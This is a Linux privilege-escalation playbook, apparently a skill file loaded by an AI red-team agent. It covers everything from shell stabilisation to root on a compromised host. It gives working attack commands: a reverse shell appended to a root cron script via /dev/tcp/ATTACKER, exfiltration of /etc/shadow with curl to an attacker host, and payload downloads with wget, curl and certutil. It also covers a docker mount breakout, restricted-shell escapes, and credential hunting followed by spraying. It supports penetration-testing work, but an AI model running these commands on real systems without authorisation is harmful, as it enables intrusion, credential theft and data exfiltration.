---
name: playbook-linux-privesc
description: Linux local privilege escalation + post-foothold enumeration on a shell you already have — stabilize the TTY, triage fast, then work the five vectors (sudo, SUID/SGID, capabilities, cron, creds) plus group-based roots. Load when you have a non-root shell on a Linux host (network/red-team lane). Payloads defer to lookup_gtfobins.
prerequisite: An interactive or semi-interactive shell on a Linux target (reverse shell, SSH, web-RCE foothold). This is the network/red-team lane — evidence is the operator log, not a Burp logger_index.
stop_condition: Two full enumeration passes (manual triage + linpeas/pspy) with no writable-by-you root primitive AND no reusable credential → record what you mapped to the operator log and pivot (lateral movement, kernel-CVE path, or a different host).
---

# Linux Local Privilege Escalation Playbook

Load when: you hold a **non-root shell** on a Linux host and want root (or a lateral pivot). Foothold-host work is Burp-blind — record evidence with `record_redteam_action` / `record_loot`, crack with `crack_hashes`, and reuse creds with `record_credential` (the network lane's capture→crack→reuse loop). Cite operator-log ids, never a `logger_index`.

## SMART MOVE — first three actions

1. **Stabilize the TTY** (§0) — a raw reverse shell has no job control, no tab-complete, and dies on Ctrl-C. Fix it before anything else.
2. **Drop `pspy`** — watch for root cron/background jobs you can't see in `crontab -l`. Start it and leave it running while you enumerate: `./pspy64 -pf -i 1000`.
3. **Fast manual triage** (§1) then one automated pass (`linpeas.sh -a`). Manual first while learning; linpeas catches what you skimmed past.

Then work the vectors §2 in ROI order: **sudo → SUID/SGID → capabilities → cron → credential reuse**, plus **group-based roots** (§4). Most easy boxes chain two of these.

## §0 Make the shell usable

### PTY upgrade (the standard sequence)
```
script -qc /bin/bash /dev/null        # or: python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z (background the shell)
stty raw -echo; fg                     # on the ATTACKER tty
# (blind) press Enter, then:
reset xterm
export TERM=xterm-256color; export SHELL=/bin/bash
stty rows 50 cols 200                  # match your terminal (stty size locally)
```
`which python || which python3` first if `script` is absent. Confirm with `tty`.

### Restricted-shell escape (rbash / lshell / no python)
- Editor breakout: `vi`/`vim` → `:set shell=/bin/bash` then `:shell` (or `:!/bin/bash`). Also `less`/`man`/`more`/`ftp` → `!/bin/sh`. See `lookup_gtfobins(binary, function="shell")`.
- SSH ProxyCommand / ForceCommand bypass: `ssh USER@IP -t "bash --noprofile"` or `-t "/bin/sh"`.
- Shellshock ForceCommand: `ssh USER@IP -t "() { :; }; /bin/bash"`.
- Command injection / chaining out of a restricted menu: `;`, `|`, `` `id` ``, `$(id)`, backslash-splitting (`l\s`). `bash` alone sometimes drops a full shell.

## §1 Fast triage — command → what you are hunting

Run top-to-bottom; each line is one grep-target, not a full scan.

| Command | Escalation signal you are hunting |
|---|---|
| `id` | UID 0 unexpected; membership in **docker / lxd / disk / shadow / adm / sudo / wheel / lpadmin** (→ §4) |
| `sudo -l` | `NOPASSWD`, broad globs (`/usr/bin/*`), an editor/interpreter, a script you can edit (→ §2.1) |
| `find / -perm -4000 -type f 2>/dev/null` | SUID binaries outside `/usr/bin`,`/bin` — anything in `/opt`, a custom name, an interpreter |
| `find / -perm -2000 -type f 2>/dev/null` | SGID binaries; SGID over a group you're in |
| `getcap -r / 2>/dev/null` | `cap_setuid`, `cap_dac_read_search`, `cap_sys_admin` on python/perl/tar/an odd binary |
| `find / -group <yourgroup> 2>/dev/null \| grep -vE '^/(proc\|run\|sys\|snap)'` | files owned by a privileged group you're in (keys, backups, root-run scripts) |
| `ls -la /etc/cron* /etc/cron.d/ 2>/dev/null; cat /etc/crontab` | root job running a **writable** script or a relative-path binary (→ §2.4) |
| `ss -tulpn` (or `netstat -antup`) | 127.0.0.1-only services nmap never saw — DB, admin UI, backup daemon (→ §2.3) |
| `env; cat ~/.bash_history ~/.*_history 2>/dev/null` | `PASSWORD`/`TOKEN`/`AWS_`/`DB_`, LD_PRELOAD/LD_LIBRARY_PATH, PATH with a writable dir |
| `cat /etc/passwd` | extra UID-0 accounts; odd login shells; file itself writable |
| `uname -a; cat /etc/os-release` | old kernel/distro → kernel-CVE path (`lookup_cve`, linux-exploit-suggester) |
| `ls -la /opt /var/www /tmp /var/tmp /dev/shm /var/mail 2>/dev/null` | app creds in webroot `.env`/`config`/`*.bak`; secrets in mail; world-writable exec dirs |

## §2 The five vectors (ROI order)

### 2.1 sudo misconfiguration
`sudo -l`. Any allowed binary → `lookup_gtfobins(binary, function="sudo")` for the breakout. `NOPASSWD` on an interpreter (python/perl/awk/find/vim), a pager (less/man), or a script you can write is a direct root shell. `env_keep`/`LD_PRELOAD` or `SETENV` → preload a `.so` that calls `setuid(0)`. `sudoedit`/wildcards → check version CVEs (Baron Samedit CVE-2021-3156, `sudo -l` alone via CVE-2019-14287 `!root`).

### 2.2 SUID / SGID
`find / -perm -4000 -type f 2>/dev/null`. Filter out the expected set (`passwd`,`sudo`,`mount`,`su`,`ping`,`pkexec`). Investigate the rest: `lookup_gtfobins(binary, function="suid")` (prefer the `-p` variant that keeps euid). A custom SUID binary → `strings`/`ltrace` it for a relative-path `system()` call → PATH hijack. `pkexec` present → check CVE-2021-4034 (PwnKit).

### 2.3 vulnerable local services
`ss -tulpn` for **127.0.0.1-bound** services (invisible to your initial nmap). Port-forward to your box and interrogate:
```
ssh -N -L 9898:127.0.0.1:9898 USER@$IP      # local forward; hit http://127.0.0.1:9898 from Kali
```
Banner-grab with `nc`/`curl`, grab a version, map it (`lookup_cve`, `research_attack_vector`). A root-owned service with RCE or a config-write feature (backup tools, job schedulers, dev UIs) is a root path. A login page means "find creds on the host" (→ §2.5).

### 2.4 cron / scheduled jobs
`pspy` is the truth source — it shows jobs `crontab -l` hides (root's crontab, systemd timers, `/etc/cron.d`). Look for a **root job running a file you can write**, a **relative path** (PATH hijack), or a **wildcard** (`tar *` / `rsync` argument injection). Overwrite the script with a confirmation payload; catch it:
```
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /path/to/writable-root-script
```
(reverse shell = SOC-loud but standard foothold confirmation; under quieter RoE, drop a SUID `bash` copy or add your key instead).

### 2.5 credential hunting + reuse
Highest-effort, highest-linkage vector. Hunt broadly, then **spray reuse** (same discipline as AD):
```
grep -RiaE 'pass(word)?|secret|api[_-]?key|token' /var/www /opt /home /etc 2>/dev/null
find / \( -name '*.conf' -o -name '*.env' -o -name '*.bak' -o -name '*.db' \) 2>/dev/null
cat ~/.bash_history; ls -la ~/.ssh; find / -name 'id_rsa' -o -name '*.pem' 2>/dev/null
```
Found a hash → `crack_hashes(domain, hash_type, hashes=...)`. Found a plaintext/cracked cred → `record_credential(domain, user, secret, valid_on=...)` then try it on every auth surface: `su`, SSH, the local DBs (`mysql -h127.0.0.1 -u.. -p..`, `psql -h127.0.0.1 ..`), and the 127.0.0.1 services from §2.3. Base64/hex-wrapped values are common — decode before cracking.

## §3 File-transfer matrix (attacker ↔ victim)

Serve from Kali: `python3 -m http.server 80` (or `impacket-smbserver share . -smb2support` for Windows).

| Direction | On victim |
|---|---|
| pull to Linux victim | `wget http://ATTACKER/f -O /tmp/f` · `curl http://ATTACKER/f -o /tmp/f` · `fetch http://ATTACKER/f` (BSD) |
| pull to Windows victim | `iwr -uri http://ATTACKER/f -OutFile C:\Windows\Temp\f` · `certutil -urlcache -f http://ATTACKER/f f` (see `lookup_lolbas`) |
| push off victim (exfil) | `curl -F f=@/etc/shadow http://ATTACKER/` · `scp file USER@ATTACKER:/path` (start `sudo service ssh start` on Kali) |
| no network tool | base64 bridge: `base64 -w0 file` on victim → copy → `base64 -d > file` on Kali |
| Windows post-ex | `net use \\ATTACKER\share` against `impacket-smbserver` |

## §4 Group-based roots (instant if you're a member — check `id` first)

- **docker** → `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (mount host `/`). Effectively root.
- **lxd / lxc** → import a tiny image, launch a privileged container with `security.privileged=true`, mount host `/` inside, chroot. `lookup_gtfobins("lxc")`.
- **disk** → `debugfs /dev/sdaN` → read `/etc/shadow`, `/root/.ssh`. Raw filesystem read.
- **shadow** → read `/etc/shadow` directly → crack root's hash (`crack_hashes` `sha512crypt`).
- **adm** → read `/var/log/*` (creds in logs, auth failures with passwords typed as usernames).
- **video / lxd / kvm / sudo / wheel** → see the group's file set: `find / -group <g> 2>/dev/null`.

## §5 Kernel / distro CVE path (last, or when config vectors are dry)

`uname -a` + `/etc/os-release` → `linux-exploit-suggester.sh` and `lookup_cve(product, version)`. Verify the exploit matches the exact kernel/build before firing (a public PoC for kernel A on kernel B usually needs an offset/struct adjustment, not a "not vulnerable"). Kernel exploits are noisy and can panic the box — prefer a config/cred path first; keep the kernel PoC as the fallback.

## Evidence + Praetor integration

- Every meaningful action → `record_redteam_action(domain, tool=..., command=..., description=..., target=<host>)`. ATT&CK auto-tags (SUID→T1548.001, sudo→T1548.003, cron→T1053.003, cred hunt→T1552.001, docker/lxd→T1611).
- Captured hash / key / cred blob → `record_loot(domain, loot_type, value, source_host=...)` (chain-of-custody, sha256, redacted shape), then `crack_hashes` → `record_credential`.
- Reuse the cred everywhere (host + the network lane): `list_credentials(domain)` feeds `run_network_recon(target, creds="DOM/user:pass")` for lateral movement.
- Forward the kill chain to the reporting hub: `sync_to_ghostwriter(domain)` (operator-log timeline + findings).

## Tools

Enumeration: `pspy` (background jobs — run it FIRST), `linpeas.sh -a`, `linux-smart-enumeration (lse.sh -l1)`, `linux-exploit-suggester.sh`, `LinEnum.sh`, `linuxprivchecker`. Install/usage: `redteam_tool_guide(tool="linpeas")`. Breakouts: `lookup_gtfobins(binary, function=...)`. Windows LOLBAS staging: `lookup_lolbas`.
